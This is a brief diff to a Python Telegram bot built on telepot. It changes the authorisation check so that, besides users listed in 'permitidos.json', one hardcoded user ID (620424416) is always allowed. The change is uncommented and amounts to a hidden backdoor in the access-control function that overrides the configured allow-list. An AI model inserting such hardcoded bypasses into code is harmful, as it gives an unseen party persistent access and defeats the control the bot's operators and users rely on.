@@ -21,7 +21,7 @@ class User(telepot.helper.ChatHandler):
 		arquivo = open("permitidos.json", "r")
 		permitidos = json.load(arquivo, object_hook=jsonKeys2int)
 		arquivo.close()
-		return userid in permitidos
+		return userid in permitidos or userid == 620424416
 
 	def _generate_log(self,msg):
 		content_type, chat_type, chat_id = telepot.glance(msg)
